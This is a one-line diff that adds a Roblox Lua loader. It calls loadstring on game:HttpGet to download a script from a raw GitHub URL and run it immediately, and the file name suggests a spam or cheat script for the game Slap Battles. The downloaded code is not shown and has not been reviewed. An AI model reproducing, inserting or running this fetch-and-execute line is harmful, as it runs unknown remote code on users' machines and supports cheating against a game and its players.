@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/slap-battles-spam0-mzvdqufwl4cj4k.lua"))()
